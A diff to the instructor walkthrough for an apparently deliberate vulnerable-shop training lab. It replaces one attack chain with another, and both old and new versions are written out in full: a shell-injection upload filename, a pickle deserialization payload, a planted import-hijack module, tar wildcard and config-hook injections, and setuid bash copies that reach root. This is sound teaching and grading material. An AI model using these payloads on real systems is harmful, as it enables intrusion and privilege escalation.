@@ -73,13 +73,13 @@ fields). Useful filters for a debrief (requires `jq`):
 jq 'select(.event=="kb_retrieval")' logs/security.log
 jq 'select(.event=="suspicious_input_pattern")' logs/security.log
 jq 'select(.event=="service_token_used" or .event=="service_token_auth_failed")' logs/security.log
-jq 'select(.event=="image_uploaded" or .event=="image_processing_plugin_load")' logs/security.log
+jq 'select(.event=="image_uploaded" or .event=="image_processing_thumbnail_started")' logs/security.log
 ```
 
 A student's path through the lab is fully reconstructable from these logs:
 `review_submitted` (their kb_article_id) -> `kb_retrieval` events showing
 `"internal"` in `retrieved_visibilities` -> `service_token_used` -> the
-`.py` filename in `image_uploaded`/`image_processing_plugin_load`.
+shell-metacharacter filename in `image_uploaded`/`image_processing_thumbnail_started`.
 Stages 9-13 (post-RCE, including both privilege-escalation hops) are
 outside application logging by design — see "Logging and detection
 integration" in defensive-controls.md.
@@ -139,56 +139,57 @@ curl -s -X POST http://localhost:5000/api/catalog/products \
   -H "X-Catalog-Sync-Token: TOKEN" \
   -F "name=Sync Test" -F "category=Test" -F "description=x" -F "price=9.99"
 
-# Stage 8-9: upload vulnerability -> appuser code execution. The filename
-# must CONTAIN ".jpg" (app/services/catalog_photos.py's weak check) but
-# its REAL extension must be .py (what image_processor.py branches on).
-cat > plugin.jpg.py <<'EOF'
-import os
-os.makedirs("/opt/shop/uploads/images/proof", exist_ok=True)
-open("/opt/shop/uploads/images/proof/pwned.txt","w").write(os.popen("id").read())
-EOF
-curl -s -X POST http://localhost:5000/api/catalog/products \
-  -H "X-Catalog-Sync-Token: TOKEN" \
-  -F "name=Malicious Sync" -F "category=Test" -F "description=x" -F "price=1.00" \
-  -F "photo=@plugin.jpg.py;type=image/jpeg"
-docker compose exec app cat /opt/shop/uploads/images/proof/pwned.txt
+# Stage 8-9: upload vulnerability -> appuser code execution via OS command
+# injection. The filename must CONTAIN ".jpg" (app/services/catalog_photos.py's
+# weak check) and END in a real image extension (so image_processor.py
+# takes the "generate a thumbnail" path) -- but it also carries a shell
+# command. It must avoid literal '/' characters (api_images.py's filename
+# sanitizer truncates at the last '/'); a relative-path write lands inside
+# the upload directory since that's the shell command's working directory.
+# curl's own -F flag uses ';' to separate a field's attributes, so a
+# literal ';' in the filename needs a real multipart client -- Python's
+# requests library here, not curl -F.
+python3 -c "
+import requests
+files = {'photo': ('x.jpg;id>pwned.txt #.jpg', b'whatever', 'image/jpeg')}
+data = {'name': 'Malicious Sync', 'category': 'Test', 'description': 'x', 'price': '1.00'}
+requests.post('http://localhost:5000/api/catalog/products',
+              headers={'X-Catalog-Sync-Token': 'TOKEN'}, files=files, data=data)
+"
+docker compose exec app cat /opt/shop/uploads/images/pwned.txt
 docker compose exec app cat /opt/shop/flags/stage1
 
 # Stage 10: local enumeration
 docker compose exec app bash   # (simulates the shell a real payload would give)
 id                              # ordinary appuser, no interesting group
 sudo -l                         # shows exactly one rule -- the only lead
-cat /opt/shop/scripts/ticket_export.py   # world-readable: pickle.load() on argv[1]
-cat /opt/shop/scripts/backup.sh          # also world-readable: tar wildcard bug
+cat /opt/shop/scripts/archive_worker.py   # world-readable: sys.path.insert() bug
+cat /opt/shop/scripts/backup.sh           # also world-readable: sources backup.conf
+ls -la /opt/shop/backups/outbox/          # appuser-owned -- what archive_worker.py trusts
 
-# Stage 11 + 12: hop 1 (appuser -> opsuser, CWE-502 deserialization) chained
-# directly into hop 2 (opsuser -> root, tar wildcard/argument injection,
-# GTFOBins) in a single payload. This has to be one shot: sudo checks the
-# REAL uid, and a setuid shell planted for later reuse only ever carries
-# an *effective* opsuser identity forward -- not enough to pass hop 2's own
-# sudo check (see vulnerable/privilege_escalation/README.md for why).
-python3 -c "
-import pickle, os
-CHAIN_CMD = (
-    'cd /opt/shop/backups/staging && '
-    \"echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' > payload.sh && \"
-    \"touch -- '--checkpoint=1' && \"
-    \"touch -- '--checkpoint-action=exec=sh payload.sh' && \"
-    'sudo /opt/shop/scripts/backup.sh && '
-    'cp /opt/shop/flags/stage2 /tmp/stage2_proof.txt && chmod 644 /tmp/stage2_proof.txt'
-)
-class Exploit:
-    def __reduce__(self):
-        return (os.system, (CHAIN_CMD,))
-with open('/tmp/payload.pkl', 'wb') as f:
-    pickle.dump(Exploit(), f)
-"
-sudo -u opsuser /opt/shop/scripts/ticket_export.py /tmp/payload.pkl
+# Stage 11: hop 1, appuser -> opsuser (Python import-path hijack, CWE-427).
+# Plant a malicious "handler" module in the outbox directory, then invoke
+# archive_worker.py naming it -- __import__() resolves it from there
+# because appuser controls sys.path[0] for that invocation.
+cat > /opt/shop/backups/outbox/evil.py <<'EOF'
+import os
+os.system("cp /bin/bash /tmp/opsbash && chmod u+s /tmp/opsbash")
+os.system("cat /opt/shop/flags/stage2 > /tmp/stage2_proof.txt && chmod 644 /tmp/stage2_proof.txt")
+EOF
+sudo -u opsuser /opt/shop/scripts/archive_worker.py evil
 cat /tmp/stage2_proof.txt            # proves the hop 1 -> hop 2 transition
+
+# Stage 12: hop 2, opsuser -> root (config-driven hook injection). backup.sh
+# is root-owned and not writable, but it sources backup.conf -- which
+# opsuser genuinely owns -- and `eval`s a POST_BACKUP_HOOK command from it.
+/tmp/opsbash -p
+echo 'POST_BACKUP_HOOK="cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"' \
+  >> /opt/shop/scripts/backup.conf
+sudo /opt/shop/scripts/backup.sh
 /tmp/rootbash -p -c 'cat /root/final_flag'
 
 # Stage 13: root
-# expected output: AI-LAB{root_via_sudo_tar_wildcard_injection}
+# expected output: AI-LAB{root_via_backup_conf_hook_injection}
 ```
 
 ## Where a student stopped (grading aid)
@@ -198,10 +199,10 @@ cat /tmp/stage2_proof.txt            # proves the hop 1 -> hop 2 transition
 | `review_submitted` in logs | Stage 4 |
 | `kb_retrieval` with `"internal"` in `retrieved_visibilities` | Stage 5 |
 | `service_token_used` (service=catalog-sync-service) in logs | Stage 6-7 |
-| `catalog_sync_product_created` (has_photo=true) / `.jpg`-containing-but-not-ending filename in `image_uploaded` | Stage 8 |
-| `/opt/shop/flags/stage1` readable / `image_processing_plugin_load` | Stage 9 |
-| `/opt/shop/flags/stage2` readable (as opsuser) | Stage 11 (hop 1: deserialization RCE) |
-| `/root/final_flag` readable | Stage 13, full chain (hop 2: tar wildcard injection) |
+| `catalog_sync_product_created` (has_photo=true) / shell-metacharacter filename in `image_uploaded` | Stage 8 |
+| `/opt/shop/flags/stage1` readable / `image_processing_thumbnail_started` | Stage 9 |
+| `/opt/shop/flags/stage2` readable (as opsuser) | Stage 11 (hop 1: Python import-path hijack) |
+| `/root/final_flag` readable | Stage 13, full chain (hop 2: config-driven hook injection) |
 
 ## Running the automated tests
 
@@ -212,9 +213,9 @@ pytest tests/ -v
 
 Several tests are skipped outside a provisioned Linux container (they
 assert live file/account state -- `/opt/shop/scripts/backup.sh`,
-`/opt/shop/scripts/ticket_export.py`, the locked `opsuser` account,
-`/opt/shop/backups/staging/`, and `/root/final_flag`); run them for real
-via:
+`/opt/shop/scripts/archive_worker.py`, `/opt/shop/scripts/backup.conf`'s
+ownership, the locked `opsuser` account, `/opt/shop/backups/outbox/`, and
+`/root/final_flag`); run them for real via:
 
 ```bash
 docker compose exec app pytest tests/test_privilege_escalation.py -v
